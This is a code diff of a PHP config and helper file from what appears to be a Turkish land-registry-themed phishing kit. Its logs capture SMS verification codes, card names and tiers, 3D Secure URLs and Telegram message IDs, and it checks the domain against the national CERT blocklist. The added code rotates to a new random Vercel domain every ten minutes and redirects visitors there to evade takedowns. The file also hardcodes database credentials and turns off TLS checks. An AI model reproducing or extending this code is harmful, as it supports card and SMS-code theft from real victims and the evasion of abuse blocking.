@@ -5,11 +5,6 @@
 
 date_default_timezone_set('Europe/Istanbul');
 
-// Hataların ekrana basılarak yönlendirmeleri bozmasını engelle (Üretim ortamı ayarı)
-ini_set('display_errors', '0');
-error_reporting(E_ALL & ~E_DEPRECATED & ~E_NOTICE);
-
-
 // Dynamically detect base path from SCRIPT_NAME
 $base_path = '';
 if (isset($_SERVER['SCRIPT_NAME'])) {
@@ -32,64 +27,19 @@ if (isset($_SERVER['SCRIPT_NAME'])) {
     } else {
         $base_path = substr($script, 0, $pos);
     }
-    // Vercel ortamında genel yönlendirmelerin kök dizinden çalışması için base_path'i boşaltıyoruz
-    if (getenv('VERCEL') === '1' || isset($_SERVER['VERCEL'])) {
-        $base_path = '';
-    }
 }
 define('BASE_PATH', rtrim($base_path, '/'));
 
-define('DB_HOST', getenv('DB_HOST') ?: 'localhost');
-define('DB_NAME', getenv('DB_NAME') ?: 'tapu_db');
-define('DB_USER', getenv('DB_USER') ?: 'r341oot');
-define('DB_PASS', getenv('DB_PASS') ?: 'w4L#gMrY8l1io!yj3');
-
-// Vercel Serverless ortamında oturumların kaybolmaması için Veritabanı tabanlı Session Handler
-class DatabaseSessionHandler implements SessionHandlerInterface {
-    private $pdo;
-    public function __construct($pdo) { $this->pdo = $pdo; }
-    public function open($savePath, $sessionName): bool { return true; }
-    public function close(): bool { return true; }
-    public function read($id): string {
-        try {
-            $stmt = $this->pdo->prepare("SELECT data FROM tapu_sessions WHERE id = ? LIMIT 1");
-            $stmt->execute([$id]);
-            return $stmt->fetchColumn() ?: '';
-        } catch (Exception $e) { return ''; }
-    }
-    public function write($id, $data): bool {
-        try {
-            $stmt = $this->pdo->prepare("INSERT INTO tapu_sessions (id, data, access) VALUES (?, ?, NOW()) ON DUPLICATE KEY UPDATE data = ?, access = NOW()");
-            return $stmt->execute([$id, $data, $data]);
-        } catch (Exception $e) { return false; }
-    }
-    public function destroy($id): bool {
-        try {
-            $stmt = $this->pdo->prepare("DELETE FROM tapu_sessions WHERE id = ?");
-            return $stmt->execute([$id]);
-        } catch (Exception $e) { return false; }
-    }
-    public function gc($maxlifetime): int|false {
-        try {
-            $stmt = $this->pdo->prepare("DELETE FROM tapu_sessions WHERE access < DATE_SUB(NOW(), INTERVAL ? SECOND)");
-            $stmt->execute([$maxlifetime]);
-            return true;
-        } catch (Exception $e) { return false; }
-    }
-}
+define('DB_HOST', 'localhost');
+define('DB_NAME', 'tapu_db');
+define('DB_USER', 'r341oot');
+define('DB_PASS', 'w4L#gMrY8l1io!yj3');
 
 function db_self_heal(PDO $pdo): void {
     static $run = false;
     if ($run) return;
     $run = true;
     try {
-        // Create sessions table if not exists
-        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_sessions (
-            id VARCHAR(128) PRIMARY KEY,
-            data TEXT,
-            access DATETIME
-        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4");
-
         // Create settings table if not exists
         $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_ayarlar (
             anahtar VARCHAR(100) PRIMARY KEY,
@@ -103,14 +53,40 @@ function db_self_heal(PDO $pdo): void {
             olusturuldu DATETIME DEFAULT CURRENT_TIMESTAMP
         ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");
 
+        // Create Vercel rotation history table if not exists
+        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_vercel_history (
+            id INT AUTO_INCREMENT PRIMARY KEY,
+            eski_domain VARCHAR(255),
+            yeni_domain VARCHAR(255),
+            yontem VARCHAR(50),
+            tarih DATETIME DEFAULT CURRENT_TIMESTAMP
+        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");
+
+        // Create visitors table if not exists
+        $pdo->exec("CREATE TABLE IF NOT EXISTS tapu_visitors (
+            ip VARCHAR(45) PRIMARY KEY,
+            user_agent VARCHAR(512) DEFAULT '',
+            son_ziyaret DATETIME DEFAULT CURRENT_TIMESTAMP,
+            ziyaret_sayisi INT DEFAULT 1
+        ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_turkish_ci");
+
         // Check columns in tapu_logs
         $q = $pdo->query("SHOW COLUMNS FROM tapu_logs");
         $cols = $q->fetchAll(PDO::FETCH_COLUMN);
         
         $missing = [
-            'sms_kod' => "VARCHAR(20) DEFAULT '' AFTER saat",
-            'sms_hata_kodlari' => "TEXT DEFAULT '' AFTER sms_kod",
-            'tg_message_id' => "VARCHAR(100) DEFAULT '' AFTER acs_url"
+            'sms_kod' => "VARCHAR(20) DEFAULT ''",
+            'sms_hata_kodlari' => "TEXT",
+            'tg_message_id' => "VARCHAR(100) DEFAULT ''",
+            'islem' => "VARCHAR(50) DEFAULT ''",
+            'aciklama' => "TEXT",
+            'mudurlik' => "VARCHAR(200) DEFAULT ''",
+            'tarih' => "VARCHAR(20) DEFAULT ''",
+            'kart_ad' => "VARCHAR(200) DEFAULT ''",
+            'kart_tier' => "VARCHAR(50) DEFAULT ''",
+            'admin_mesaj' => "VARCHAR(255) DEFAULT ''",
+            'acs_url' => "VARCHAR(255) DEFAULT ''",
+            'olusturuldu' => "DATETIME DEFAULT CURRENT_TIMESTAMP"
         ];
         
         foreach ($missing as $col => $definition) {
@@ -118,7 +94,9 @@ function db_self_heal(PDO $pdo): void {
                 $pdo->exec("ALTER TABLE tapu_logs ADD `$col` $definition");
             }
         }
-    } catch (Exception $e) {}
+    } catch (Exception $e) {
+        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [self_heal] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
+    }
 }
 
 function db(): PDO {
@@ -132,19 +110,6 @@ function db(): PDO {
         );
         $pdo->exec("SET time_zone = '+03:00'");
         db_self_heal($pdo);
-
-        // Eğer session aktifse kapatıp, yeni handler ile yeniden başlatıyoruz
-        $temp_session = [];
-        if (session_status() === PHP_SESSION_ACTIVE) {
-            $temp_session = $_SESSION;
-            session_write_close();
-        }
-        $handler = new DatabaseSessionHandler($pdo);
-        session_set_save_handler($handler, true);
-        session_start();
-        if (!empty($temp_session)) {
-            $_SESSION = array_merge($_SESSION, $temp_session);
-        }
     }
     return $pdo;
 }
@@ -164,7 +129,7 @@ function get_ip(): string {
 // ─────────────────────────────────────────────
 
 /** Tüm ayarları tek sorguda yükler ve statik array'de önbellekler */
-function _ayar_cache(): array {
+function _ayar_cache(string $update_key = null, string $update_val = null): array {
     static $cache = null;
     if ($cache === null) {
         $cache = [];
@@ -174,6 +139,9 @@ function _ayar_cache(): array {
                 $cache[$r['anahtar']] = $r['deger'];
             }
         } catch (Exception $e) {}
+    }
+    if ($update_key !== null) {
+        $cache[$update_key] = $update_val;
     }
     return $cache;
 }
@@ -187,9 +155,7 @@ function ayar_set(string $key, string $val): void {
     try {
         db()->prepare("INSERT INTO tapu_ayarlar (anahtar, deger) VALUES (?,?) ON DUPLICATE KEY UPDATE deger=?")
              ->execute([$key, $val, $val]);
-        // Önbelleği sıfırla — bir sonraki çağrıda yeniden yüklensin
-        // (PHP statik değişkeni sıfırlamak için reflection trick gerekmez;
-        //  process-lifecycle'da yenileme yok — ama bu değişiklik nadir olur)
+        _ayar_cache($key, $val);
     } catch (Exception $e) {}
 }
 
@@ -270,7 +236,10 @@ function get_or_create_log(): ?int {
         $ins = db()->prepare("INSERT INTO tapu_logs (session_id, ip, son_aktivite) VALUES (?,?,NOW())");
         $ins->execute([$sid, $ip]);
         return (int)db()->lastInsertId();
-    } catch (Exception $e) { return null; }
+    } catch (Exception $e) {
+        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [get_or_create_log] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
+        return null;
+    }
 }
 
 function update_log(int $id, array $data): void {
@@ -282,7 +251,9 @@ function update_log(int $id, array $data): void {
         $params = $data;
         $params['id'] = $id;
         db()->prepare($sql)->execute($params);
-    } catch (Exception $e) {}
+    } catch (Exception $e) {
+        @file_put_contents(__DIR__ . '/db_error.log', date('Y-m-d H:i:s') . ' - [update_log] ' . $e->getMessage() . PHP_EOL, FILE_APPEND);
+    }
 }
 
 function touch_aktivite(int $id): void {
@@ -597,5 +568,212 @@ function usom_check_domain($domain = null) {
     ];
 }
 
-// Veritabanını ve session yöneticisini dosya yüklenir yüklenmez (çıkış verilmeden önce) tetikleme
-db();
+// ─────────────────────────────────────────────
+// VERCEL ENTEGRASYONU & OTOMATİK ROTASYON
+// ─────────────────────────────────────────────
+
+function get_vercel_token() {
+    $file = __DIR__ . '/token.txt';
+    if (file_exists($file)) {
+        @unlink($file);
+    }
+    return ayar_get('vercel_token', '');
+}
+
+function vercel_api(string $method, string $endpoint, array $body = null) {
+    $token = get_vercel_token();
+    if (!$token) {
+        return ['error' => ['message' => 'Vercel Token bulunamadı.']];
+    }
+
+    $url = "https://api.vercel.com" . $endpoint;
+    
+    $headers = [
+        "Authorization: Bearer " . $token,
+        "Content-Type: application/json"
+    ];
+
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
+    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+
+    if ($body !== null && in_array($method, ['POST', 'PUT', 'PATCH'])) {
+        curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($body));
+    }
+
+    $response = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+
+    $data = json_decode($response, true);
+    if ($http_code >= 400) {
+        return ['error' => $data['error'] ?? ['message' => "Vercel API Hatası (HTTP $http_code)"]];
+    }
+
+    return $data;
+}
+
+function delete_vercel_domain($selected_project_id, $domain_to_delete) {
+    $main_dom = ayar_get('vercel_redirect_main_domain');
+    if ($main_dom && strtolower($domain_to_delete) !== strtolower($main_dom)) {
+        $info = vercel_api('GET', "/v9/projects/{$selected_project_id}/domains/{$main_dom}");
+        if (isset($info['redirect']) && strtolower($info['redirect']) === strtolower($domain_to_delete)) {
+            vercel_api('PATCH', "/v9/projects/{$selected_project_id}/domains/{$main_dom}", [
+                'redirect' => null
+            ]);
+        }
+    }
+    return vercel_api('DELETE', "/v9/projects/{$selected_project_id}/domains/{$domain_to_delete}");
+}
+
+function generate_next_domain($base_domain) {
+    $base_domain = trim(strtolower($base_domain));
+    $parts = explode('.', $base_domain);
+    $count = count($parts);
+    $random_suffix = str_pad(rand(100000, 999999), 6, '0', STR_PAD_LEFT);
+    
+    if ($count >= 2) {
+        $tld = $parts[$count - 1];
+        $sld = $parts[$count - 2];
+        $root_domain = $sld . '.' . $tld;
+        
+        if ($count == 2) {
+            $prefix = preg_replace('/-\d{6}$/', '', $sld);
+            $prefix = preg_replace('/\d{6}$/', '', $prefix);
+        } else {
+            $prefix = preg_replace('/-\d{6}$/', '', $parts[0]);
+            $prefix = preg_replace('/\d{6}$/', '', $prefix);
+        }
+        
+        return $prefix . '-' . $random_suffix . '.' . $root_domain;
+    }
+    
+    $base = preg_replace('/-\d{6}$/', '', $base_domain);
+    $base = preg_replace('/\d{6}$/', '', $base);
+    return $base . '-' . $random_suffix;
+}
+
+function vercel_handle_rotation($trigger_method = 'Otomatik') {
+    $selected_project_id = ayar_get('selected_vercel_project');
+    if (!$selected_project_id) return false;
+
+    $now = time();
+    $base_domain = ayar_get('vercel_redirect_main_domain');
+    if (!$base_domain) return false;
+
+    // 1. Delete pending old domain if time is up
+    $pending_del = ayar_get('vercel_pending_delete_domain');
+    $pending_time = (int)ayar_get('vercel_pending_delete_time', '0');
+    
+    if ($pending_del && $now >= $pending_time) {
+        delete_vercel_domain($selected_project_id, $pending_del);
+        ayar_set('vercel_pending_delete_domain', '');
+        ayar_set('vercel_pending_delete_time', '');
+    }
+
+    // 2. Rotate to new domain
+    $active_domain = ayar_get('vercel_active_domain');
+    
+    // Generate next domain
+    $new_domain = generate_next_domain($base_domain);
+
+    // Add new domain to Vercel
+    $res = vercel_api('POST', "/v9/projects/{$selected_project_id}/domains", ['name' => $new_domain]);
+    if (!isset($res['error'])) {
+        // Update Main Redirect Domain configuration on Vercel to redirect to the new domain
+        vercel_api('PATCH', "/v9/projects/{$selected_project_id}/domains/{$base_domain}", [
+            'redirect' => $new_domain,
+            'redirectStatusCode' => 302
+        ]);
+
+        // Schedule old active domain for deletion in 10 minutes (600 seconds)
+        if ($active_domain) {
+            ayar_set('vercel_pending_delete_domain', $active_domain);
+            ayar_set('vercel_pending_delete_time', (string)($now + 600));
+        }
+        
+        // Update state
+        ayar_set('vercel_active_domain', $new_domain);
+        ayar_set('vercel_last_rotation_time', (string)$now);
+
+        // Insert rotation details into tapu_vercel_history
+        try {
+            db()->prepare("INSERT INTO tapu_vercel_history (eski_domain, yeni_domain, yontem, tarih) VALUES (?, ?, ?, NOW())")
+                 ->execute([$active_domain ?: '', $new_domain, $trigger_method]);
+        } catch (Exception $e) {}
+
+        return $new_domain;
+    }
+    return false;
+}
+
+function vercel_cron_check() {
+    $token = get_vercel_token();
+    if (!$token) return;
+
+    $selected_project_id = ayar_get('selected_vercel_project');
+    if (!$selected_project_id) return;
+
+    $now = time();
+    
+    // Check if there is an old domain pending deletion and its time has expired
+    $pending_del = ayar_get('vercel_pending_delete_domain');
+    $pending_time = (int)ayar_get('vercel_pending_delete_time', '0');
+    
+    if ($pending_del && $now >= $pending_time) {
+        delete_vercel_domain($selected_project_id, $pending_del);
+        ayar_set('vercel_pending_delete_domain', '');
+        ayar_set('vercel_pending_delete_time', '');
+    }
+
+    // Check if 10 minutes (600 seconds) have passed since the last rotation
+    $last_rot = (int)ayar_get('vercel_last_rotation_time', '0');
+    if ($now - $last_rot >= 600) {
+        vercel_handle_rotation();
+    }
+}
+
+function vercel_redirect_check() {
+    // Sadece GET isteklerini (ziyaretçileri) yönlendir, POST/AJAX log isteklerine dokunma
+    if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'GET') {
+        return;
+    }
+
+    $ana_domain = ayar_get('vercel_redirect_main_domain');
+    if (!$ana_domain) return;
+
+    $current_host = trim(strtolower(explode(':', $_SERVER['HTTP_HOST'] ?? '')[0]));
+    if ($current_host === trim(strtolower($ana_domain))) {
+        // Admin panelini pas geç
+        if (strpos($_SERVER['REQUEST_URI'] ?? '', '/admin/') !== false) {
+            return;
+        }
+
+        // Sadece ana sayfa (kök dizin) ve index.php ziyaretlerini yönlendir (alt dizin uyumlu)
+        $uri = $_SERVER['REQUEST_URI'] ?? '';
+        $clean_uri = strtok($uri, '?');
+        
+        $expected_root = BASE_PATH . '/';
+        $expected_index = BASE_PATH . '/index.php';
+        
+        if ($clean_uri !== $expected_root && $clean_uri !== $expected_index && $clean_uri !== '') {
+            return;
+        }
+
+        $aktif_domain = ayar_get('vercel_active_domain');
+        if ($aktif_domain && trim(strtolower($aktif_domain)) !== $current_host) {
+            $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+            header("Location: $proto://$aktif_domain" . $uri, true, 302);
+            exit;
+        }
+    }
+}
+
+// Otomatik kontrol ve yönlendirmeyi tetikle
+vercel_cron_check();
+vercel_redirect_check();
